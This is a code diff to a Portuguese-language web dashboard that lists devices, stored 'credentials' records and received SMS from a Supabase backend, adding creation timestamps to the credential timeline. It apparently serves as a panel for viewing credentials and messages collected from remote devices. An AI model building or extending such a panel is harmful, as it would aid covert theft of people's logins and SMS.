@@ -1488,7 +1488,7 @@ function renderLista(dispositivos, credenciais) {
       <div class="device-sinais-container" data-device-id="${idAttr}">${renderHistoricoSinaisDevice(dev.device_id)}</div>
       <div class="timeline-title">📋 Histórico de actividade</div>
       <div class="timeline">${devCreds.length===0?'<div class="empty">Sem registos</div>':devCreds.map(c=>`
-        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">—</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>Conteúdo sensível ocultado</div></div></div>
+        <div class="tl-item"><div class="tl-dot ${getTipoDot(c.tipo)}"></div><div class="tl-time">${escapeHtml(formatDate(c.criado_em))}</div><div class="tl-content"><div class="tipo">${getTipoLabel(c.tipo)}</div><div>Registo #${escapeHtml(c.id)} · Device ${escapeHtml((c.device_id||"").slice(0,16))}</div><div>Valor sensível não carregado</div></div></div>
       `).join("")}</div>
       <div class="timeline-title" onclick="toggleSMS(${idArg})">💬 SMS recebidas (${todasSMS.filter(s=>s.device_id===dev.device_id).length}) <span id="sms-chevron-${idAttr}">▶</span></div>
       <div class="timeline" id="sms-${idAttr}" style="display:none">
@@ -1698,7 +1698,7 @@ async function carregarDados() {
       fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000", {headers})
     ]);
     const d1=await r1.json(), d3=await r3.json();
-    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo&order=id.desc");
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,criado_em&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1798,7 +1798,7 @@ function iniciarPainel() {
         fetch(SUPA_URL+"/rest/v1/sms?select=id,device_id,timestamp_ms&order=timestamp_ms.desc&limit=1000",{headers:h})
       ]);
       const d1=await r1.json(), d3=await r3.json();
-      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo&order=id.desc");
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=id,device_id,tipo,criado_em&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
